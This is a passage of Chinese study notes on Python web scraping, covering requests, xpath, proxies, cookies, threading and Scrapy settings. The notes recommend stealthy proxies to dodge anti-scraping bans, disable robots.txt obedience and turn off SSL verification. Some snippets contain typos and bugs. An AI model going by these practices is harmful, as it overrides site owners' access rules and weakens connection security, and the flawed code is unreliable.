Safari/537.36'\n}\n#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存\ndata_pict = requests.get(url=url, headers=headers).content\nwith open('./beauty_pict.jpg', 'wb') as fp:\n    fp.write(data_pict)\n```\n\n# 爬虫第四天\n### 爬取百度图片（星空图片）\n\n```python\nimport requests\nimport re\nimport os\nimport time\n\nif __name__ == '__main__':\n    #创建一个文件夹，存放图片\n    if not os.path.exists('./star_sky'):\n        os.mkdir('./star_sky')\n        \n    url = 'https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&form=IGRE&first=1&cw=1117&ch=714'\n    headers = {\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    data_pict = requests.get(url=url, headers=headers).text\n\n    #正则匹配\n    ex = '<a class=.*?murl&quot;:&quot;(.*?)&quot;.*?>'\n    star_list = re.findall(ex, data_pict, re.S)\n    for i in star_list:\n        url_2 = i\n        #请求到了图片的二进制数据\n        data_2_pict = requests.get(url=url_2, headers=headers).content\n        #为图片设置名称\n        img_name = url_2.split(\"/\")[-1]\n        img_path = './star_sky/' + img_name\n        with open(img_path, 'wb') as fp:\n            fp.write(data_2_pict)\n        print(img_name + '...successful')\n        time.sleep(0.1)\n\n****************************************未完，，待更新********************************************\n```\n### xpath\n\n- xpath解析：最常用且最便捷高效的一种解析方式，具有通用性\n      -xpath解析原理：\n          -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中\n          -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获\n      -如何实例化一个etree对象\n          *from lxml import etree\n          -1、将 本地的html文档中的源代码数据加载到etree对象中：\n              etree.parse(filepath)\n          -2、可以将从互联网上获取的数据加载到该对象中\n              etree.HTML('page_text')###page_text就是获取的响应数据\n          - xpath('xpath表达式')\n          -xpath表达式：\n                  - / ：表示的是从根目录结点开始定位，表示的是一个层级\n                          - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）\n                          -属性定位：tag[@attrName=\"attrValue\"]\n                          -索引定位：p[n] 索引是从1开始的\n                          -取文本：\n              - /text() 获取的是标签中直系的文本内容\n              - //text() 标签中非直系的文本内容（所有的文本内容）\n              -[0] 可以去除列表框\n                  -取属性\n              -/@attrName\n              \n\n### xpath代码实战示例：\n\n```python\n#爬取妹子图片，总共有俩千多张\nimport requests\nfrom lxml import etree\nimport os\n\nif __name__ == '__main__':\n    ii = 1\n    if not os.path.exists('./girl'):\n        os.mkdir('./girl')\n    url_list = [i for i in range(1, 50)]\n    url_list[1] = ''\n\n    for page in url_list:\n        url = 'https://www.lanvshen.com/zhongguo/' + str(page) +'.html'\n        headers = {\n            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n        }\n        get_text = requests.get(url=url, headers=headers)\n        tree = etree.HTML(get_text.text)\n        pict_ = tree.xpath('//div[@class=\"hezi\"]//li')\n        for it_ in pict_:\n            img_url = it_.xpath('./a/img/@src')[0]\n            img_name = str(ii) + '.jpg'\n            img = requests.get(url=img_url, headers=headers).content\n            img_path = './girl/' + img_name\n            with open(img_path, 'wb') as fp:\n                fp.write(img)\n            print(img_name + 'sccuessful...')\n            ii = ii + 1\n\n##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢\n##后期将学习爬取高清图片，并进行分布式爬取\n\n```\n\n\n\n### ip代理\n\n1. 代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，\n   代理服务器拿到目的网站的数据后，再转发给我们的代码\n2. [这个网站可以方便的查看http请求的一些参数](http://httpbin.org) \n3. 在代码中(requests模块)使用代理：\n\n```python\n\timport requests\n\n\turl = 'http://httpbin.org'\n\theaders = {\n\t\t'User-Anget': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n\t}\n\n\t#设置代理\n\tproxy = {\n\t\t'http': '123.54.194.96:38661'\n\t}\n\tget_text = requerts.get(url=url, headers=headers, proxies=proxy).text\n\tprint(get_text)\n```\n\n4. 网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效\n5. 代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们\n   的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的\n\n### cookie \n\n* [cookie与session的差异](http://blog.sina.com.cn/s/blog_628571e601019uis.html)\n\n* [cookie技术深入](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd )\t\t\t \n\n  - Cookie是什么？\t \n\n  Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。\n  Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。\n\n  - 为什么需要Cookie？ \n\n    因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。\n    所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。\n\n  - Cookie能做什么？ \n\n    Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它\n    不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。\n\n  - Cookie 的限制\n\n    大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，\n    或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。 \n    浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；\n    如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie\n    总数作出绝对限制，通常为 300 个。\n\n![Cookie示意图](C:/Users/Acer/Desktop/笔记/爬虫_day4_files/1.jpg)\t\n\n- 处理cookie\n  如果想要在多次请求中共享cookie，那么应该使用session\n\n### 处理不信任的SSL证书\n\n```python\nresp = resquests.get(url=url, vrrify=False).content\n\n```\n\n### 多线程\n\n* 多线程之生产者与消费者模型\n\n- 代码示例一：(Lock版)\n\n```python\n\t\"\"\"\n\t关于多线程生产者消费者模型\n\t\"\"\"\n\timport threading\n\timport time\n\timport random\n\n\tgMoney = 1000\n\tgLock = threading.Lock()\n\tgTotalTimes = 10\n\tgTimes = 0\n\n\n\t# 生产线程Producer\n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\tglobal gTimes\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgLock.acquire()\n\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\tgLock.release()\n\t\t\t\t\tbreak\n\t\t\t\tgMoney += money\n\t\t\t\tprint('{}生产了{}元钱，剩余{}元钱'\n\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\tgTimes += 1\n\t\t\t\tgLock.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\t# 消费线程Consumer\n\tclass Consumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgLock.acquire()\n\t\t\t\tif gMoney >= money:\n\t\t\t\t\tgMoney -= money\n\t\t\t\t\tprint('{}消费者消费了{}元钱，剩余{}元钱'\n\t\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\t# 若剩余金额不足以消费，则退出循环\n\t\t\t\telse:\n\t\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\t\tgLock.release()\n\t\t\t\t\t\tbreak\n\t\t\t\t\tprint('{}消费者准备消费{}元钱，剩余{}元钱，不足！'\n\t\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\tgLock.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tdef mainIt():\n\t\t# 设置3个消费线程\n\t\tfor x in range(3):\n\t\t\tt = Consumer(name='消费者线程{}'.format(x))\n\t\t\tt.start()\n\t\t\t# 设置5个生产线程\n\n\t\tfor x in range(5):\n\t\t\tt = Producer(name='生产者线程{}'.format(x))\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmainIt()\n\n```\n\n- 代码示例二：(condition版)\n\n```python\n \n\timport threading\n\timport random\n\timport time\n\n\tgMoney = 1000\n\tgCondition = threading.Condition()  # 等同于threading.Lock\n\tgTimes = 0\n\tgTotalTimes = 5\n\t\n\n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\tglobal gCondition\n\t\t\tglobal gTimes\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgCondition.acquire()  # 加锁（全局变量改变前（gMoney））\n\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\tgCondition.release()  # 解锁\n\t\t\t\t\tprint(\"当前生产者总共生产了%s次\" % gTimes)\n\t\t\t\t\tbreak\n\t\t\t\tgMoney += money\n\t\t\t\tprint(\"%s当前存入%s元钱，剩余%s元线\" % (threading.current_thread(), money, gMoney))\n\t\t\t\tgTimes += 1\n\t\t\t\tgCondition.notify_all()  # 通知正在等待的线程（wait）\n\t\t\t\tgCondition.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tclass Cosumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgCondition.acquire()\n\t\t\t\twhile gMoney < money:\n\t\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\t\tgCondition.release()\n\t\t\t\t\t\treturn\n\t\t\t\t\tprint(\"%s准备消费%d元钱，剩余%d元钱，不足\" % (threading.current_thread(), money, gMoney))\n\t\t\t\t\tgCondition.wait()  # 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）\n\t\t\t\tgMoney -= money\n\t\t\t\tprint(\"%s消费了%d元钱，剩余%d元钱\" % (threading.current_thread(), money, gMoney))\n\t\t\t\tgCondition.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tdef main():\n\t\tfor x in range(3):\n\t\t\tt = Cosumer(name=\"消费者线程%s\" % x)\n\t\t\tt.start()\n\t\tfor y in range(5):\n\t\t\tt1 = Producer(name=\"生产者线程%s\" % y)\n\t\t\tt1.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n- 多线程Lock与condition方法总结：\n  1. 在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，\n     这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费\n  2. 当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，\n     使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就\n     减少了循环过程中因上锁解锁而导致的CPu资源浪费\n\n* Queue线程安全队列\n  在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块\n  叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要\n  么做完。可使用队列来实现线程的同步。相关函数如下：\n  作用：\n  　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。\n  　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。\n\n1. Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限\n\n2. Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限\n\n3. Queue.qsize()   返回队列的大小\n\n4. Queue.empty()   如果队列为空，返回True,反之False\n\n5. Queue.full()   如果队列满了，返回True,反之False\n\n6. Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间\n\n7. Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间\n\n8. Queue.queue.clear()   清空队列\n\n9. class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高\n\n10. Queue.get(timeout = 1)如果1秒后没取到数据就退出\n\n11. Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常\n\n12. Queue.task_done()后续调用告诉队列，任务的处理是完整的。\n\n```python\n\tfrom queue import Queue\n\timport time\n\timport threading\n\n\n\t# 在队列中放入数值\n\tdef set_value(q):\n\t\tindex = 0\n\t\twhile True:\n\t\t\tq.put(index)\n\t\t\tindex += 1\n\t\t\ttime.sleep(0.8)\n\n\n\t# 取出队列中的数值\n\tdef get_value(q):\n\t\twhile True:\n\t\t\tprint(q.get())\n\n\n\tdef main():\n\t\t# 产生一个队列\n\t\tq = Queue(1)\n\t\tt1 = threading.Thread(target=set_value, args=[q])\n\t\tt2 = threading.Thread(target=get_value, args=[q])\n\n\t\tt1.start()\n\t\tt2.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 生产者与消费者模型\n\n- 代码示例三：(Queue版)\n\n```python\n\timport threading,time\n\t#python2  from Queue import Queue\n\t#python3\n\timport queue\n\t \n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal queue\n\t\t\tcount = 0\n\t\t\twhile True:\n\t\t\t\t#qsize返回queue内部长度\n\t\t\t\tif queue.qsize() < 1000:\n\t\t\t\t\tfor i in range(100):\n\t\t\t\t\t\tcount += 1\n\t\t\t\t\t\tmsg = '生成产量'+str(count)\n\t\t\t\t\t\t#put是往queue中放入\n\t\t\t\t\t\tqueue.put(msg)\n\t\t\t\t\t\tprint(msg)\n\t\t\t\ttime.sleep(0.5)\n\tclass Consumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal queue\n\t\t\twhile True:\n\t\t\t\tif queue.qsize() > 100:\n\t\t\t\t\tfor i in range(3):\n\t\t\t\t\t\t#get从queue中取出一个值\n\t\t\t\t\t\tmsg = self.name + \"消费了\"+queue.get()\n\t\t\t\t\t\tprint(msg)\n\t\t\t\ttime.sleep(1)\n\tif __name__ == '__main__':\n\t\tqueue = queue.Queue()\n\t\tfor i in range(500):\n\t\t\tqueue.put(\"初始产品\"+str(i))\n\t\tfor i in range(2):\n\t\t\tp = Producer()\n\t\t\tp.start()\n\t\tfor i in range(5):\n\t\t\tc = Consumer()\n\t\t\tc.start()\n\t\t\t\n```\n\n### 爬虫之多线程\n\n* 多线程爬虫框架代码\n\n```python\n\timport requests\n\tfrom lxml import etree\n\timport os\n\timport re\n\tfrom queue import Queue\n\timport threading\n\n\t\"\"\" \n\t我们引入了threading这个包，我们将使用这个包中的\n\tThread类，并在我们自定义的类中继承这个Thread类\n\t\"\"\"\n\n\n\t# 生产者线程\n\tclass Procuder(threading.Thread):\n\t\theaders = {\n\t\t\t\t'User-Agent': '... 浏览器...'\n\t\t}\n\n\t\t\"\"\" 重写继承于父类的__init__方法 \"\"\"\n\t\t\"\"\" 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收\"\"\"\n\t\tdef __init__(self, page_queue, img_queue, *args, **kwargs):\n\t\t\tsuper(Procuder, self).__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\n\t\t\"\"\" 重写继承于父类的run方法，改成我们想要的方法\"\"\"\n\t\t\"\"\" 从存放每页的url的队列中逐一挑出一个url并传入parse_page中\n\t\t\t获取每页的url\n\t\t\"\"\"\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\turl = self.page_queue.get()\n\t\t\t\tself.parse_page(url)\n\n\t\tdef parse_page(self, url):\n\t\t\t\"\"\" \n\t\t\t.......\n\t\t\t\n\t\t\t获取每页的响应数据，并从中提取出每张图片的\n\t\t\turl和name，并放入队列中\n\t\t\t\"\"\"\n\n\n\t# 消费者线程\n\tclass Consumer(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, *args, **kwargs):\n\t\t\tsuper(Procuder, self).__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.img_queue.empty() and self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\t\t\"\"\"\n\t\t\t\t\t......\n\t\t\t\t\t\n\t\t\t\t\t利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存\n\t\t\t\t\t\"\"\"\n\n\tdef main():\n\t\t\"\"\" 设置页数和图片的url队列\"\"\"\n\t\tpage_queue = Queue()\n\t\timg_queue = Queue()\n\n\t\t# 将每页的url放到页数队列中\n\t\tfor x in range(1, 101):\n\t\t\turl = 'http://........ %d' % x\n\t\t\tpage_queue.put(url)\n\n\t\t# 设置5个生产者线程\n\t\tfor x in range(5):\n\t\t\tt = Procuder(page_queue, img_queue)\n\t\t\tt.start()\n\n\t\t# 设置5个消费者线程\n\t\tfor x in range(5):\n\t\t\tt = Consumer(page_queue, img_queue)\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 多线程爬虫实战代码\n\n```python\n\timport requests\n\timport re\n\tfrom lxml import etree\n\timport threading\n\timport os\n\timport queue\n\tfrom urllib import request\n\n\t# 生产图片的url和name\n\tclass ProimgUrl(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n\t\t\tsuper().__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\t\t\tself.headers = headers\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\turl = self.page_queue.get()\n\t\t\t\t\tself.parse_page(url)\n\n\t\tdef parse_page(self, url):\n\t\t\timg_get = requests.get(url=url, headers=self.headers).text\n\t\t\ttree = etree.HTML(img_get)\n\t\t\timg_it = tree.xpath('//div[@class=\"page-content text-center\"]//a')\n\t\t\tfor it in img_it:\n\t\t\t\timg_url = it.xpath('./img[@class!=\"gif\"]/@data-original')[0]\n\t\t\t\talt = it.xpath('./img/@alt')[0]\n\t\t\t\talt = re.sub(r'[\\?？.!！，。\\/\\*]', '', alt)\n\t\t\t\t# 利用splitext截取图片的后缀名\n\t\t\t\tsuffix = os.path.splitext(img_url)[1]\n\t\t\t\timg_name = alt + suffix\n\t\t\t\tself.img_queue.put((img_url, img_name))\n\n\n\t# 获取图片并储存\n\tclass ConimgName(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n\t\t\tsuper().__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\t\t\tself.headers = headers\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.img_queue.empty() and self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\timg_url, img_name = self.img_queue.get()\n\t\t\t\t\t# 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片\n\t\t\t\t\trequest.urlretrieve(img_url, './smile/'+img_name)\n\t\t\t\t\tprint(img_name + ' 下载成功...')\n\n\tdef main():\n\t\tif not os.path.exists('./smile'):\n\t\t\tos.mkdir('./smile')\n\t\theaders = {\n\t\t\t'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n\t\t\t\t\t\t  'Chrome/80.0.3987.149 Safari/537.36 '\n\t\t}\n\t\tpage_queue = queue.Queue(100)\n\t\timg_queue = queue.Queue(1000)\n\n\t\tfor x in range(1, 10):\n\t\t\turl = 'https://www.doutula.com/photo/list/?page=' + str(x)\n\t\t\tpage_queue.put(url)\n\n\t\tfor i in range(5):\n\t\t\tt = ProimgUrl(page_queue, img_queue, headers)\n\t\t\tt.start()\n\n\t\tfor i in range(5):\n\t\t\tt = ConimgName(page_queue, img_queue, headers)\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的\n\n\n\n# 爬虫第五天\n\n## scrapy爬虫框架\n\n[关于xpath选择器selector的网址](https://zhuanlan.zhihu.com/p/25443389)\n\n\n\n![scrapy框架示意图](https://img-blog.csdnimg.cn/20200328091921480.png)\n\n1. 创建项目\n\n   ​\tscrapy startproject #^%#^(项目名字)\n\n   \n\n2. 创建爬虫\n\n   ​\tscrapy genspider 爬虫名字 网络域名\n\n   注意：\n\n    * 爬虫名字不要和项目名字一样\n    * 网站域名是允许爬虫采集的域名\n      - baidu.com\n\n![创建项目与配置环境后各部分组件](https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)\n\nitem文件是存储数据的\n\n* 在setting文件（程序启动被首先检查的文件）\n\n* BOT_NAME = 爬虫的名字\n\n* ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔\n\n* CONCURRENT_REQUESTS = 爬虫的并发量\n\n* DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管\n\n* COOKLES_ENABLED = cookiede的使用，布尔\n\n* DEFAULT_REQUEST_HEADERS = 默认请求头\n\n* ITEM_PIPELINES = 管道文件\n\n  \n\n  ### setting文件详解\n\n  ```python\n  # -*- coding: utf-8 -*-\n   \n  # Scrapy settings for TestSpider project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n   \n  BOT_NAME = 'TestSpider'\n   \n  SPIDER_MODULES = ['TestSpider.spiders']\n  NEWSPIDER_MODULE = 'TestSpider.spiders'\n   \n   \n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  #USER_AGENT = 'TestSpider (+http://www.yourdomain.com)'\n   \n  USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0'\n   \n  # Obey robots.txt rules\n  # Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。\n  # 默认是True，设置为False不遵守这个协议。\n  ROBOTSTXT_OBEY = False\n   \n   \n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # 配置scrapy的请求连接数，默认会同时并发16个请求。\n  # CONCURRENT_REQUESTS = 10\n   \n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n   \n  # 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0\n  # DOWNLOAD_DELAY = 3\n   \n   \n  # CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。\n  # CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n   \n   \n  # Disable cookies (enabled by default)\n  # 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。\n  # COOKIES_ENABLED = False\n   \n  # Disable Telnet Console (enabled by default)\n  #TELNETCONSOLE_ENABLED = False\n   \n   \n  # Override the default request headers:\n   \n  # 配置默认的请求头Headers.\n  # DEFAULT_REQUEST_HEADERS = {\n  #   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n  #   'Accept-Language': 'en',\n  # }\n   \n   \n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n   \n  # 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。\n  # SPIDER_MIDDLEWARES = {\n  #    'TestSpider.middlewares.TestspiderSpiderMiddleware': 543,\n  # }\n   \n   \n  # 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。\n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = {\n  #    'TestSpider.middlewares.TestspiderDownloaderMiddleware': 543,\n  # }\n   \n   \n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = {\n  #    'scrapy.extensions.telnet.TelnetConsole': None,\n  # }\n   \n   \n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n   \n  # 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。\n  # ITEM_PIPELINES = {\n  #    'TestSpider.pipelines.TestspiderPipeline': 300,\n  # }\n   \n   \n  # 限速配置\n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n   \n  # 是否开启自动限速\n  # AUTOTHROTTLE_ENABLED = True\n   \n   \n  # The initial download delay\n  # 配置初始url的下载延时\n  # AUTOTHROTTLE_START_DELAY = 5\n   \n   \n  # The maximum download delay to be set in case of high latencies\n  # 配置最大请求时间\n  # AUTOTHROTTLE_MAX_DELAY = 60\n   \n   \n  # 配置请求和请求之间的下载间隔，单位是秒\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n   \n   \n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n   \n   \n  # 关于Http缓存的配置，默认是不启用。\n  # 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。\n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  #HTTPCACHE_ENABLED = True\n  #HTTPCACHE_EXPIRATION_SECS = 0\n  #HTTPCACHE_DIR = 'httpcache'\n  #HTTPCACHE_IGNORE_HTTP_CODES = []\n  #HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n  ```\n\n  ### scrapy爬虫之spider类（示例 一：爬取糗事百科）\n\n  - 创建爬虫项目：scrapy startproject xiushi\n  - 创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com\n\n  #### item 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Define here the models for your scraped items\n  #\n  # See documentation in:\n  # https://doc.scrapy.org/en/latest/topics/items.html\n  \n  import scrapy\n  \n  \n  class XiushiItem(scrapy.Item):\n      # define the fields for your item here like:\n      # name = scrapy.Field()\n      title = scrapy.Field()\n      text = scrapy.Field()\n  \n  ```\n\n  #### setting 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Scrapy settings for xiushi project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  \n  BOT_NAME = 'xiushi'\n  \n  SPIDER_MODULES = ['xiushi.spiders']\n  NEWSPIDER_MODULE = 'xiushi.spiders'\n  \n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  # USER_AGENT = 'xiushi (+http://www.yourdomain.com)'\n  \n  # Obey robots.txt rules\n  ROBOTSTXT_OBEY = False\n  \n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # CONCURRENT_REQUESTS = 32\n  \n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n  DOWNLOAD_DELAY = 1\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n  \n  # Disable cookies (enabled by default)\n  # COOKIES_ENABLED = False\n  \n  # Disable Telnet Console (enabled by default)\n  # TELNETCONSOLE_ENABLED = False\n  \n  # Override the default request headers:\n  DEFAULT_REQUEST_HEADERS = {\n      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n      'Accept-Language': 'en',\n      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                    'Chrome/80.0.3987.163 Safari/537.36 '\n  }\n  \n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  # SPIDER_MIDDLEWARES = {\n  #    'xiushi.middlewares.XiushiSpiderMiddleware': 543,\n  # }\n  \n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = {\n  #    'xiushi.middlewares.XiushiDownloaderMiddleware': 543,\n  # }\n  \n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = {\n  #    